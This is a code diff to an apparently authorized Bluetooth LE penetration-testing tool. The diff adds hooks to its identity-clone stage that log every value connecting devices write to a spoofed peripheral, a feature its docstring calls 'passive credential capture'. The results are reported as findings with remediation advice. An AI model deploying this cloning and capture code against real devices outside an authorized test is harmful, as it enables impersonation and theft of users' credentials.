@@ -21,6 +21,44 @@ log = get_logger("s3_clone")
 CLONE_DURATION = 120
 
 
+def _attach_write_hooks(profile: GenericProfile, written_log: list[dict]) -> None:
+    """Attach on_write callbacks to all writable characteristics.
+
+    Enables passive credential capture: every value a connecting central writes
+    to our cloned peripheral is logged in real-time. Entire body is wrapped in
+    try/except — if the installed WHAD version does not expose the required
+    methods, hook attachment silently no-ops and current behaviour is unchanged.
+    """
+    try:
+        count = 0
+        for svc in profile.services():
+            for char in svc.characteristics():
+                if not char.writeable():
+                    continue
+                uuid_str = str(char.uuid)
+
+                def _hook(c, v, wr, _log=written_log, _uuid=uuid_str):
+                    entry = {
+                        "uuid": _uuid,
+                        "handle": c.handle,
+                        "value_hex": bytes(v).hex() if v else "",
+                        "without_response": bool(wr),
+                        "ts": time(),
+                    }
+                    _log.append(entry)
+                    log.info(
+                        f"[S3] WRITE captured: uuid={_uuid} "
+                        f"val={entry['value_hex']}"
+                    )
+
+                char.on_write(_hook)
+                count += 1
+        if count:
+            log.debug(f"[S3] Write hooks attached to {count} characteristic(s)")
+    except Exception as exc:
+        log.debug(f"[S3] Write hook attach failed: {exc}")
+
+
 def run(
     dongle: WhadDongle,
     target: Target,
@@ -41,6 +79,9 @@ def run(
     else:
         profile = _build_clone_profile(target)
     adv_data = _build_adv_data(target)
+
+    written_log: list[dict] = []
+    _attach_write_hooks(profile, written_log)
 
     periph = dongle.peripheral(profile=profile)
     _monitor = None
@@ -111,6 +152,10 @@ def run(
             pass
 
     severity = "critical" if connections_received else "medium"
+    write_detail = (
+        f" {len(written_log)} application write(s) captured from connecting central(s)."
+        if written_log else ""
+    )
 
     finding = Finding(
         type="identity_clone",
@@ -121,6 +166,7 @@ def run(
             f"({target.name or 'unnamed'}). "
             f"{len(connections_received)} central(s) connected "
             f"to the clone during {CLONE_DURATION}s test window."
+            f"{write_detail}"
         ),
         remediation=(
             "Implement mutual authentication (LE Secure Connections "
@@ -134,6 +180,7 @@ def run(
             "device_class": target.device_class,
             "connections_received": connections_received,
             "duration_seconds": CLONE_DURATION,
+            "writes_captured": written_log,
         },
         pcap_path=str(_pcap),
         engagement_id=engagement_id,
